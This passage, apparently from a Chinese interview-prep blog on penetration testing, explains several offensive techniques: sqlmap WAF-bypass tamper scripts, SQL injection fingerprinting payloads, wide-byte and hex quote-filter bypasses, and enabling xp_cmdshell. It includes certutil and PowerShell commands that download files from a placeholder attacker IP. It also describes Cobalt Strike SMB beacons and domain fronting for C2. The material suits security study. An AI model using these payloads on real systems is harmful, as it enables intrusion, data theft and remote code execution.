</ul>
</li>
<li><code>**unionalltounion.py**</code>：将 <code>UNION ALL</code> 替换为 <code>UNION</code>，在某些情况下可能绕过过滤</li>
<li><code>**space2plus.py**</code>：将空格替换为加号 <code>+</code>，但需要注意这可能影响语句语义</li>
</ul>
<p><strong>3. 语义与结构混淆</strong></p>
<p>这类脚本通过改变语句的逻辑结构，来使注入语句看起来像正常的查询</p>
<ul>
<li><code>**between.py**</code>：将大于等于 <code>&gt;=</code> 替换为 <code>BETWEEN</code><ul>
<li><strong>示例：</strong> <code>id&gt;=1</code> -&gt; <code>id BETWEEN 1 AND 999</code></li>
</ul>
</li>
<li><code>**ifnull2casewhenisnull.py**</code>：将 <code>IFNULL(A, B)</code> 替换为 <code>CASE WHEN ISNULL(A) THEN B ELSE A END</code></li>
</ul>
<p><strong>4. 绕过 WAF 的特定脚本</strong></p>
<p>这些脚本通常针对特定的安全产品或通用 WAF 规则</p>
<ul>
<li><code>**modsecurityzeroversioned.py**</code>：在 SQL 语句后添加 <code>/*-!11111*/</code> 来绕过 ModSecurity WAF 的特定规则</li>
<li><code>**xforwardedfor.py**</code>：在 HTTP 请求头中伪造 <code>X-Forwarded-For</code> 字段，以绕过基于 IP 的限制</li>
<li><code>**sp_password.py**</code>：在有效载荷的末尾添加 <code>sp_password</code> 来绕过 MS-SQL Server 的日志记录</li>
</ul>
<hr>
<h3 id="扫出后缀为-asp-的数据库文件，访问乱码如何利用"><a href="#扫出后缀为-asp-的数据库文件，访问乱码如何利用" class="headerlink" title="扫出后缀为 .asp 的数据库文件，访问乱码如何利用"></a>扫出后缀为 .asp 的数据库文件，访问乱码如何利用</h3><p>这是最常见的情况。利用步骤如下：</p>
<ul>
<li><strong>使用工具直接打开</strong>：<ul>
<li>使用 <strong>Microsoft Access</strong> 软件直接打开。这是最直接的方式</li>
<li>使用 <strong>Navicat Premium</strong>、<strong>DBeaver</strong> 或其他支持 <code>.mdb</code> 格式的数据库管理工具打开。这些工具通常兼容性更好，即使文件头被修改，也可能能识别并打开</li>
</ul>
</li>
<li><strong>获取敏感信息</strong>：<ul>
<li>打开数据库后，立即检查所有表（Tables）</li>
<li><strong>重点关注</strong>：<ul>
<li><strong>管理员表</strong>：通常命名为 <code>admin</code>、<code>users</code>、<code>manager</code> 等</li>
<li><strong>用户表</strong>：通常包含 <code>username</code>、<code>password</code>、<code>email</code> 等字段</li>
<li><strong>配置表</strong>：可能包含数据库连接字符串、API 密钥等</li>
<li><strong>订单&#x2F;客户信息表</strong>：包含用户的个人隐私数据</li>
</ul>
</li>
</ul>
</li>
<li><strong>破解加密密码</strong>：<ul>
<li>如果密码字段是加密或散列（hash）的，需要进一步处理</li>
<li><strong>常见哈希类型</strong>：MD5、SHA1 等</li>
<li><strong>破解方法</strong>：<ul>
<li><strong>在线查询</strong>：如果哈希值是常见的，可以尝试在 <strong>HashKiller</strong>、<strong>Crackstation</strong> 等在线网站查询。</li>
<li><strong>字典破解</strong>：使用 <strong>John the Ripper</strong> 或 <strong>Hashcat</strong> 等工具，配合强大的密码字典进行暴力破解。</li>
<li><strong>彩虹表</strong>：使用预先计算好的彩虹表进行快速查询</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="找到一个注入点怎么判断对方什么数据库"><a href="#找到一个注入点怎么判断对方什么数据库" class="headerlink" title="找到一个注入点怎么判断对方什么数据库"></a>找到一个注入点怎么判断对方什么数据库</h3><p><strong>1. 报错信息判断</strong></p>
<p>最直接的方法就是观察数据库的报错信息。如果网站没有对错误信息进行处理，数据库的报错会直接显示在页面上，通常包含了数据库的名称或版本信息</p>
<ul>
<li><strong>MySQL</strong>：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use</code></li>
<li><strong>SQL Server</strong>：<code>Microsoft OLE DB Provider for SQL Server</code>、<code>Incorrect syntax near &#39;...</code></li>
<li><strong>Oracle</strong>：<code>ORA-01756: quoted string not properly terminated</code></li>
<li><strong>PostgreSQL</strong>：<code>PostgreSQL query failed: ERROR: parser: parse error</code></li>
<li><strong>SQLite</strong>：<code>sqlite_query()</code>、<code>SQL syntax error</code></li>
</ul>
<p><strong>2. 特有函数和语法判断</strong></p>
<p>即使没有报错信息，你也可以通过注入特定数据库的函数或语法，观察页面的响应来判断。这种方法常用于<strong>盲注</strong>场景</p>
<p><strong>MySQL</strong></p>
<ul>
<li><strong><code>version()</code></strong>：<code>and 1=1 and version()</code>。如果页面返回了版本号（如 <code>5.5.53</code>），那就是 MySQL</li>
<li><strong><code>sleep()</code></strong>：<code>and sleep(5)</code>。如果页面延迟了 5 秒，那很有可能是 MySQL</li>
<li><strong><code>user()</code></strong>：<code>and user()</code></li>
<li><strong><code>database()</code></strong>：<code>and database()</code></li>
<li><strong><code>load_file()</code></strong>：<code>and load_file(&#39;/etc/passwd&#39;)</code></li>
</ul>
<p><strong>SQL Server</strong></p>
<ul>
<li><strong><code>@@version</code></strong>：<code>and 1=1 and @@version</code>。如果页面返回版本信息，则是 SQL Server</li>
<li><strong><code>xp_cmdshell</code></strong>：<code>and 1=1;exec xp_cmdshell(&#39;ping 127.0.0.1&#39;)--</code>。如果请求延迟，可能存在命令执行漏洞</li>
<li><strong><code>db_name()</code></strong>：<code>and db_name()</code></li>
<li><strong><code>system_user</code></strong>：<code>and system_user</code></li>
</ul>
<p><strong>Oracle</strong></p>
<ul>
<li><strong><code>user</code></strong>：<code>and user</code></li>
<li><strong><code>sys.dba_tables</code></strong>：<code>and 1=1 and (select count(*) from sys.dba_tables)</code>。如果返回正常的页面，说明存在这张表</li>
<li><strong><code>dbms_pipe.receive_message()</code></strong>：<code>and 1=1 and dbms_pipe.receive_message(&#39;a&#39;,5)</code>。可以用来进行带外信道（OOB）注入</li>
</ul>
<p><strong>PostgreSQL</strong></p>
<ul>
<li><strong><code>pg_sleep()</code></strong>：<code>and pg_sleep(5)</code>。如果页面延迟，很可能是 PostgreSQL</li>
<li><strong><code>version()</code></strong>：<code>and version()</code></li>
<li><strong><code>pg_database</code></strong>：<code>and 1=1 and (select count(*) from pg_database)</code></li>
</ul>
<p><strong>3. 不同数据库的查询差异</strong></p>
<p>每种数据库的查询语法都有一些细微的差别，可以利用这些差异来判断</p>
<ul>
<li><strong>字符串拼接</strong>：<ul>
<li><strong>MySQL</strong>：<code>union select &#39;a&#39;,&#39;b&#39;</code></li>
<li><strong>SQL Server</strong>：<code>union select &#39;a&#39;+&#39;b&#39;</code></li>
<li><strong>Oracle</strong>：<code>union select &#39;a&#39;||&#39;b&#39;</code></li>
</ul>
</li>
<li><strong>注释符号</strong>：<ul>
<li><strong>MySQL&#x2F;PostgreSQL</strong>：<code>-- </code>（后面需要加空格）、<code>#</code></li>
<li><strong>SQL Server&#x2F;Oracle</strong>：<code>--</code></li>
<li><strong>内联注释</strong>：<code>/**/</code> 可以在多种数据库中使用</li>
</ul>
</li>
</ul>
<hr>
<h3 id="单引号被过滤怎么绕过"><a href="#单引号被过滤怎么绕过" class="headerlink" title="单引号被过滤怎么绕过"></a>单引号被过滤怎么绕过</h3><p><strong>1. 使用双引号</strong></p>
<p>如果后端代码在 SQL 查询中使用了双引号 <code>&quot;</code> 来包裹字符串，那么你可以尝试用双引号进行注入</p>
<p><strong>原始查询：</strong> <code>SELECT * FROM users WHERE username = &quot;$username&quot;</code></p>
<p><strong>注入尝试：</strong> <code>username=&quot; or 1=1 -- &quot;</code></p>
<p><strong>最终执行的 SQL：</strong> <code>SELECT * FROM users WHERE username = &quot;&quot; or 1=1 -- &quot;</code></p>
<p>这种情况并不常见，因为多数开发者会优先使用单引号。但它是一个很好的起点，值得尝试</p>
<p><strong>2. 使用十六进制编码</strong></p>
<p>有些数据库（如 MySQL）允许使用十六进制编码来表示字符串。你可以将单引号 <code>&#39;</code> 或整个字符串（如 <code>or 1=1</code>）进行十六进制编码，然后通过 <code>0x</code> 前缀传入</p>
<p><strong>原始查询：</strong> <code>SELECT * FROM users WHERE id = &#39;...注入点...&#39;</code></p>
<p><strong>注入尝试：</strong> 假设你要注入 <code>or 1=1</code>，单引号 <code>&#39;</code> 的十六进制是 <code>0x27</code>。 <code>&#39; or 1=1 -- </code> 的十六进制是 <code>0x27206f7220313d31202d2d20</code></p>
<p><strong>完整 URL 注入：</strong> <code>id=0x27206f7220313d31202d2d20</code></p>
<p><strong>最终执行的 SQL：</strong> <code>SELECT * FROM users WHERE id = &#39;or 1=1 -- &#39;</code></p>
<p>虽然这看起来很直接，但实际应用中，你需要将整个注入语句进行十六进制编码，因为后端可能不仅过滤单引号，还可能过滤其他关键字</p>
<p><strong>3. 使用宽字节注入</strong></p>
<p>宽字节注入是一种专门针对 PHP 的 <code>addslashes()</code> 函数和 <code>magic_quotes_gpc</code> 配置的绕过技术。在某些字符集（如 GBK）中，一个汉字占用两个字节</p>
<p>当服务器使用 <code>addslashes()</code> 函数时，它会将单引号 <code>&#39;</code> 转义为 <code>\&#39;</code>。在 ASCII 编码下，<code>\</code> 的十六进制是 <code>0x5c</code>，<code>&#39;</code> 是 <code>0x27</code>，所以 <code>\&#39;</code> 就是 <code>0x5c27</code></p>
<p>但如果后端数据库使用了 GBK 编码，且它将 <code>0x5c</code> 和它前面的一个字节组合成一个汉字时，那么 <code>\&#39;</code> 中的 <code>\</code> 就会被“吃掉”，从而使得后面的单引号 <code>&#39;</code> 重新生效</p>
<p><strong>攻击步骤：</strong></p>
<ol>
<li>找到一个 GBK 编码的网站</li>
<li>在 URL 中注入一个宽字节，例如 <code>%df</code></li>
<li>然后注入单引号</li>
</ol>
<p><strong>注入尝试：</strong> <code>id=1%df%27</code></p>
<p><strong>服务器端处理：</strong></p>
<ol>
<li>PHP 的 <code>addslashes()</code> 函数收到 <code>%df&#39;</code></li>
<li>它在 <code>&#39;</code> 前面加上 <code>\</code>，变成 <code>%df\&#39;</code></li>
<li>URL 编码后，<code>%df\&#39;</code> 变为 <code>%df%5c%27</code></li>
<li>当这个字符串传到数据库时，GBK 编码会把 <code>%df%5c</code> 当作一个汉字，<code>%27</code> 就会单独留下，恢复成单引号 <code>&#39;</code></li>
</ol>
<p><strong>最终执行的 SQL：</strong> <code>SELECT * FROM users WHERE id = &#39;1運&#39;&#39;...</code> (<code>&#39;運&#39;</code> 是一个汉字) 后面的 <code>&#39;</code> 就成为我们控制的单引号，可以用来闭合语句</p>
<p><strong>4. 使用反斜线 <code>\</code> 绕过 <code>addslashes</code></strong></p>
<p>在某些情况下，如果后端代码没有过滤反斜线，你可以通过注入一个反斜线来“吃掉” <code>addslashes</code> 自动添加的反斜线</p>
<p><strong>原始查询：</strong> <code>SELECT * FROM users WHERE id = &#39;...注入点...&#39;</code></p>
<p><strong>注入尝试：</strong> <code>id=1\&#39;</code></p>
<p><strong>服务器端处理：</strong></p>
<ol>
<li>PHP 的 <code>addslashes()</code> 函数收到 <code>1&#39;</code></li>
<li>它在 <code>&#39;</code> 前面加上 <code>\</code>，变成 <code>1\&#39;</code></li>
<li>如果前端的输入是 <code>1\&#39;</code>， <code>addslashes</code> 会将 <code>\&#39;</code> 变为 <code>\\&#39;</code></li>
</ol>
<p>这个方法需要深入理解后端如何处理输入。如果后端代码只对单引号进行了转义，而没有对反斜线进行处理，你就可以用一个反斜线来闭合它</p>
<p><strong>5. <code>char()</code> 函数绕过</strong></p>
<p><code>char()</code> 函数可以将数字转换为字符。你可以利用这个函数来构造单引号</p>
<p><strong>注入尝试：</strong> <code>id=1 and 1=1 and (select char(39))</code> <code>id=1 union select 1,2,3 from users where username=char(39)adminchar(39)</code></p>
<p>这种方法通常用于绕过对特定字符串（如 <code>&#39;</code>）的过滤，但不能绕过对整个注入语句的过滤</p>
<p><strong>6. 使用 <code>like</code> 语句绕过</strong></p>
<p>在某些盲注场景下，如果无法使用单引号，可以尝试使用 <code>like</code> 语句来代替 <code>union</code> 或 <code>and</code></p>
<p><strong>注入尝试：</strong> <code>id=1 and 1 like 1 and 1=1 --</code> <code>id=1 and 1 like database()</code></p>
<p>这种方法适用于特定的 SQL 语句结构，但并非万能</p>
<hr>
<h3 id="MySQL-一个-和两个-的区别"><a href="#MySQL-一个-和两个-的区别" class="headerlink" title="MySQL 一个 @ 和两个 @ 的区别"></a>MySQL 一个 @ 和两个 @ 的区别</h3><p><strong><code>@</code>（用户自定义变量）</strong></p>
<p>一个 <code>@</code> 符号代表<strong>用户自定义变量</strong>（User-Defined Variables）。这种变量是用户在当前会话中手动创建的，它的生命周期只存在于当前 MySQL 连接会话中。当会话结束时，变量也会被释放</p>
<p><strong>特点：</strong></p>
<ul>
<li><strong>创建与赋值</strong>：可以使用 <code>SET</code> 或 <code>SELECT ... INTO</code> 语句来赋值<ul>
<li><code>SET @var_name = value;</code></li>
<li><code>SELECT column INTO @var_name FROM table;</code></li>
</ul>
</li>
<li><strong>作用域</strong>：仅在当前连接会话中有效。一个用户设置的 <code>@var_name</code> 无法被其他用户连接访问</li>
<li><strong>用途</strong>：常用于存储临时数据、在多条 SQL 语句中传递值，或者在存储过程、函数中作为临时变量</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 在当前会话中设置一个变量</span></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@total_price</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用该变量进行计算</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@total_price</span> <span class="operator">*</span> <span class="number">1.1</span> <span class="keyword">AS</span> price_with_tax;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在另一个新的连接中，@total_price 变量是不存在的，它的值为 NULL。</span></span><br></pre></td></tr></table></figure>

<p><strong><code>@@</code>（系统变量）</strong></p>
<p>两个 <code>@</code> 符号代表<strong>系统变量</strong>（System Variables）。这些变量是 MySQL 服务器预先定义好的，用于控制服务器的各种行为和状态</p>
<p>系统变量分为两种：</p>
<ul>
<li><strong>全局系统变量 (<code>@@global.var_name</code>)</strong>：影响 MySQL 服务器的<strong>所有会话</strong>。需要有 <code>SUPER</code> 权限才能修改</li>
<li><strong>会话系统变量 (<code>@@session.var_name</code> 或 <code>@@var_name</code>)</strong>：仅影响<strong>当前连接会话</strong>。它的值会继承自全局变量，但可以在会话中被单独修改，且不会影响其他会话</li>
</ul>
<p><strong>特点：</strong></p>
<ul>
<li><strong>查看</strong>：可以使用 <code>SHOW VARIABLES</code> 或 <code>SELECT @@var_name</code> 来查看</li>
<li><strong>修改</strong>：使用 <code>SET</code> 语句进行修改<ul>
<li><code>SET GLOBAL max_connections = 200;</code></li>
<li><code>SET SESSION sql_mode = &#39;STRICT_TRANS_TABLES&#39;;</code></li>
<li><code>SET sql_mode = &#39;STRICT_TRANS_TABLES&#39;;</code>（<code>SESSION</code> 是默认的）</li>
</ul>
</li>
<li><strong>用途</strong>：管理和调整数据库的各种配置，如最大连接数、字符集、缓冲区大小、SQL 模式等</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看当前会话的字符集</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@character_set_client</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看全局最大连接数</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@global</span>.max_connections;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在当前会话中改变 SQL 模式，不影响其他会话</span></span><br><span class="line"><span class="keyword">SET</span> sql_mode <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在所有会话中改变 SQL 模式 (需要 SUPER 权限)</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> sql_mode <span class="operator">=</span> <span class="string">&#x27;STRICT_TRANS_TABLES&#x27;</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>特性</th>
<th>@ (用户变量)</th>
<th>@@ (系统变量)</th>
</tr>
</thead>
<tbody><tr>
<td>全称</td>
<td>User-Defined Variable</td>
<td>System Variable</td>
</tr>
<tr>
<td>创建者</td>
<td>用户自定义</td>
<td>MySQL 服务器预定义</td>
</tr>
<tr>
<td>作用域</td>
<td>仅当前会话</td>
<td>全局或当前会话</td>
</tr>
<tr>
<td>主要用途</td>
<td>存储临时数据，方便在多条 SQL 中传递</td>
<td>管理和配置服务器行为</td>
</tr>
<tr>
<td>生命周期</td>
<td>会话结束即失效</td>
<td>随服务器启动而加载</td>
</tr>
<tr>
<td>可否修改</td>
<td>用户随时可改</td>
<td>全局需要 SUPER 权限，会话可自由修改</td>
</tr>
</tbody></table>
<hr>
<h3 id="为什么-MMSQL-存储过程可以执行命令"><a href="#为什么-MMSQL-存储过程可以执行命令" class="headerlink" title="为什么 MMSQL 存储过程可以执行命令"></a>为什么 MMSQL 存储过程可以执行命令</h3><p><strong>1. <code>xp_cmdshell</code> 存储过程</strong></p>
<p>这是 MSSQL 中最著名，也是最危险的命令执行功能</p>
<p><strong>原理</strong></p>
<p><code>xp_cmdshell</code> 是一个扩展存储过程（e<strong>x</strong>tended <strong>p</strong>rocedure）。它允许你在 SQL Server 内部执行操作系统的 <strong><code>cmd.exe</code></strong> 命令</p>
<p>当你执行 <code>EXEC xp_cmdshell &#39;dir c:\&#39;</code> 时，SQL Server 会：</p>
<ol>
<li>启动一个 <code>cmd.exe</code> 进程</li>
<li>将你的命令作为参数传递给 <code>cmd.exe</code></li>
<li>将命令的输出结果以行的形式返回到 SQL Server 的结果集中</li>
</ol>
<p><strong>使用条件</strong></p>
<p>默认情况下，从 SQL Server 2005 开始，<code>xp_cmdshell</code> 处于<strong>禁用状态</strong>。要成功利用它，需要满足以下两个条件：</p>
<ul>
<li><p><strong>权限</strong>：你必须拥有 <strong><code>sysadmin</code></strong> 服务器角色或**<code>CONTROL SERVER</code>**权限，这是因为 <code>xp_cmdshell</code> 默认只授予这些高权限用户</p>
</li>
<li><p><strong>启用配置</strong>：<code>xp_cmdshell</code> 必须通过以下 SQL 命令手动启用：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>在渗透测试中，如果成功通过 SQL 注入或其他方式获得了高权限，你就可以执行这些命令来启用 <code>xp_cmdshell</code>，然后执行任意系统命令</p>
<p><strong>2. 其他相关的危险存储过程</strong></p>
<p>除了 <code>xp_cmdshell</code>，MSSQL 还有其他一些可以执行命令或辅助命令执行的存储过程，但它们不像 <code>xp_cmdshell</code> 那样直接</p>
<p><strong><code>sp_addextendedproc</code></strong></p>
<ul>
<li><strong>原理</strong>：这个存储过程允许你将一个外部 DLL 文件注册为 SQL Server 的扩展存储过程</li>
<li><strong>用途</strong>：如果攻击者能上传一个恶意的 DLL 文件到服务器，就可以利用 <code>sp_addextendedproc</code> 将其注册为一个新的扩展存储过程，然后通过执行这个过程来执行恶意代码，从而绕过 <code>xp_cmdshell</code> 的禁用限制</li>
</ul>
<p><strong>CLR 集成（SQL CLR）</strong></p>
<ul>
<li><strong>原理</strong>：SQL Server 允许你使用 .NET 语言（如 C#）编写存储过程、函数、触发器等。这些代码可以调用 .NET 框架中的类库，包括那些可以执行系统命令的类，如 <code>System.Diagnostics.Process</code></li>
<li><strong>用途</strong>：攻击者可以编写一个恶意的 C# 代码，将其编译成 DLL，然后加载到 SQL Server 中。这是一种更隐蔽、更强大的命令执行方法，因为它不依赖于 <code>xp_cmdshell</code></li>
</ul>
<hr>
<h3 id="如果想通过-MMSQL-上传文件需要开启哪个存储过程的权限"><a href="#如果想通过-MMSQL-上传文件需要开启哪个存储过程的权限" class="headerlink" title="如果想通过 MMSQL 上传文件需要开启哪个存储过程的权限"></a>如果想通过 MMSQL 上传文件需要开启哪个存储过程的权限</h3><p><strong>1. 利用 <code>xp_cmdshell</code> 存储过程（最常见）</strong></p>
<p>如前面所述，<code>xp_cmdshell</code> 是执行系统命令的利器。一旦你获得了执行 <code>xp_cmdshell</code> 的权限（通常是 <code>sysadmin</code>），就可以通过它来执行命令行下的文件上传操作</p>
<ul>
<li><p><strong>所需权限</strong>：<code>sysadmin</code> 服务器角色或 <code>CONTROL SERVER</code> 权限，并且 <code>xp_cmdshell</code> 必须已启用</p>
</li>
<li><p><strong>实现方法</strong>：</p>
<ul>
<li><p><strong>方法一：利用 <code>certutil</code> 下载文件</strong> 这是最常见且非常实用的方法，它利用 Windows 自带的 <code>certutil.exe</code> 工具来下载文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;certutil.exe -urlcache -split -f &quot;http://&lt;攻击机IP&gt;/&lt;文件名&gt;&quot; &quot;c:\\&lt;文件保存路径&gt;\\&lt;文件名&gt;&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这种方法的好处是，<code>certutil</code> 是 Windows 系统自带的，不容易被杀毒软件拦截</p>
</li>
<li><p><strong>方法二：利用 PowerShell 下载文件</strong> 使用 PowerShell 的 <code>Invoke-WebRequest</code> 或 <code>Net.WebClient</code> 方法来下载文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;powershell.exe -c &quot;Invoke-WebRequest -Uri http://&lt;攻击机IP&gt;/&lt;文件名&gt; -OutFile c:\\&lt;文件保存路径&gt;\\&lt;文件名&gt;&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>或者使用更简单的别名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;powershell.exe -c &quot;iwr http://&lt;攻击机IP&gt;/&lt;文件名&gt; -OutFile c:\\&lt;文件保存路径&gt;\\&lt;文件名&gt;&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>方法三：利用其他命令行工具</strong> 如果目标机器上安装了 <code>wget</code>、<code>curl</code> 等工具，你也可以使用它们</p>
</li>
</ul>
</li>
</ul>
<p><strong>2. 利用数据库的 <code>OPENROWSET</code> 或 <code>BULK INSERT</code></strong></p>
<p>这种方法相对不那么常见，但如果 <code>xp_cmdshell</code> 被禁用，这是一种可以尝试的备选方案。它主要利用 MSSQL 强大的文件处理能力</p>
<ul>
<li><p><strong>所需权限</strong>：</p>
<ul>
<li><code>sysadmin</code> 或 <code>bulkadmin</code> 角色</li>
<li><code>BULK INSERT</code> 需要对目标文件夹有写权限，并且 <code>OPENROWSET</code> 必须启用 <code>Ad Hoc Distributed Queries</code></li>
</ul>
</li>
<li><p><strong>实现方法</strong>：</p>
<ul>
<li><p><strong>方法一：<code>OPENROWSET</code></strong> 这种方法可以从一个共享网络路径（UNC Path）读取数据，并插入到数据库表中。虽然它主要用于数据导入，但你可以利用它将文件内容导入到数据库，再通过其他方式导出</p>
</li>
<li><p><strong>方法二：<code>BULK INSERT</code></strong> 和 <code>OPENROWSET</code> 类似，<code>BULK INSERT</code> 也能从网络共享路径读取文件数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BULK <span class="keyword">INSERT</span> MyTable</span><br><span class="line"><span class="keyword">FROM</span> <span class="string">&#x27;\\&lt;攻击机IP&gt;\share\&lt;文件名&gt;&#x27;</span></span><br><span class="line"><span class="keyword">WITH</span> (</span><br><span class="line">  ROWTERMINATOR <span class="operator">=</span> <span class="string">&#x27;EOF&#x27;</span>,</span><br><span class="line">  DATA_SOURCE <span class="operator">=</span> <span class="string">&#x27;MyDataSource&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>这种方法需要 MSSQL 服务的运行用户对网络共享路径有读取权限</p>
</li>
</ul>
</li>
</ul>
<p><strong>3. 利用 SQL CLR 集成</strong></p>
<p>这是一种高级且隐蔽的上传文件方法。如果你能够执行 SQL CLR 代码，你就可以编写一个 .NET 存储过程，该存储过程包含文件读写功能</p>
<ul>
<li><strong>所需权限</strong>：<code>sysadmin</code> 或 <code>EXTERNAL ACCESS ASSEMBLY</code> 权限</li>
<li><strong>实现方法</strong>：<ol>
<li>用 C# 编写一个可以从 URL 下载文件并保存到本地的 DLL</li>
<li>将 DLL 文件上传到服务器，或者通过 <code>xp_cmdshell</code> 下载</li>
<li>使用 SQL 命令将 DLL 注册为 SQL CLR 程序集</li>
<li>执行你编写的存储过程，实现文件上传</li>
</ol>
</li>
</ul>
<hr>
<h1 id="6-横向移动系列"><a href="#6-横向移动系列" class="headerlink" title="6- 横向移动系列"></a>6- 横向移动系列</h1><h3 id="CS-上线不出网机器用到的什么类型的-Beacon"><a href="#CS-上线不出网机器用到的什么类型的-Beacon" class="headerlink" title="CS 上线不出网机器用到的什么类型的 Beacon"></a>CS 上线不出网机器用到的什么类型的 Beacon</h3><p><strong>SMB Beacon</strong></p>
<p><strong>SMB Beacon</strong> 是 CS 中专门用于内网横向移动和命令控制的类型。它的工作原理是利用 <strong>命名管道（Named Pipe）</strong>，通过 <strong>SMB 协议</strong> 与目标机器上的 Beacon 进行通信</p>
<p><strong>工作流程</strong>：</p>
<ol>
<li><strong>初始上线</strong>：首先，您需要在内网中找到一台可以出网的机器，通常是已经通过常规方式（如 HTTP&#x2F;S Beacon）上线的机器，我们称之为 <strong>“中继机器”</strong></li>
<li><strong>创建 SMB Beacon</strong>：在中继机器上，您可以使用 CS 的 <code>psexec</code>、<code>psexec_psh</code> 或 <code>wmi</code> 等模块，通过 <strong>派生（Spawn）</strong> 的方式，将 SMB Beacon 部署到不出网的目标机器上</li>
<li><strong>管道通信</strong>：一旦目标机器上的 SMB Beacon 启动，它会创建一个命名管道。中继机器上的 Beacon 会通过这个管道与目标机器上的 SMB Beacon 进行通信</li>
<li><strong>命令传递</strong>：中继机器上的 Beacon 接收到来自您 Cobalt Strike 客户端的命令后，会通过 SMB 管道将其传递给目标机器上的 SMB Beacon。反之亦然，目标机器的执行结果也会通过管道返回给中继机器，最终传回您的客户端</li>
</ol>
<p><strong>优点</strong>：</p>
<ul>
<li><strong>隐蔽性强</strong>：SMB 协议在内网中非常常见，不易引起安全设备的警觉</li>
<li><strong>无需出网</strong>：这是它最大的优势，能够完美解决内网不出网机器的上线问题</li>
<li><strong>横向移动</strong>：它是 CS 进行内网横向渗透的核心组件之一</li>
</ul>
<p><strong>HTTP&#x2F;S Beacon with Domain Fronting (域前置)</strong></p>
<p>虽然严格来说，<strong>域前置</strong> 并不是一种 Beacon 类型，但它是一种非常有效的技术，可以帮助 <strong>HTTP&#x2F;S Beacon</strong> 伪装流量，从而绕过一些网络限制，间接实现不出网机器的上线</p>
<p><strong>工作原理</strong>：</p>
<p>域前置利用了内容分发网络 <strong>CDN</strong> 的特性。CDN 允许一个请求的 <strong>主机头（Host Header）</strong> 和实际连接的 IP 地址不一致</p>
<p><strong>工作流程</strong>：</p>
<ol>
<li><strong>正常流量</strong>：攻击者在 CS 中将 Beacon 的 C2 地址设置为 CDN 的域名（如 <code>cdn.microsoft.com</code>），而实际上 Beacon 会向 CDN 的 IP 地址发送请求</li>
<li><strong>CDN 代理</strong>：当 CDN 收到请求后，它会根据 HTTP 请求中的 <code>Host</code> 字段，将请求转发到攻击者在 CDN 上配置的真实 C2 服务器</li>
<li><strong>绕过限制</strong>：对于不出网的机器，如果它的网络策略允许访问 CDN 节点的 IP，那么它就可以成功将流量发送出去，因为在它的网络视角中，它只是在访问一个合法的 CDN 资源，而不会被认为是恶意流量</li>
</ol>
<p><strong>优点</strong>：</p>
<ul>
<li><strong>伪装性强</strong>：流量看起来像是访问合法的大型云服务商或 CDN，难以被检测</li>
<li><strong>绕过防火墙</strong>：可以绕过一些基于域名的白名单或黑名单策略</li>
</ul>
<hr>
<h3 id="现在在域外有一台工作组机器的权限但没有域用户且无法直接通过漏洞进入域内，请问这种情况怎么进入域中找到域控"><a href="#现在在域外有一台工作组机器的权限但没有域用户且无法直接通过漏洞进入域内，请问这种情况怎么进入域中找到域控" class="headerlink" title="现在在域外有一台工作组机器的权限但没有域用户且无法直接通过漏洞进入域内，请问这种情况怎么进入域中找到域控"></a>现在在域外有一台工作组机器的权限但没有域用户且无法直接通过漏洞进入域内，请问这种情况怎么进入域中找到域控</h3><p><strong>1. 探索工作组机器与域的关联</strong></p>
<p>虽然这台机器不属于域，但它可能与域内的资源或用户有业务往来，这些连接就是你的切入点</p>
<ul>
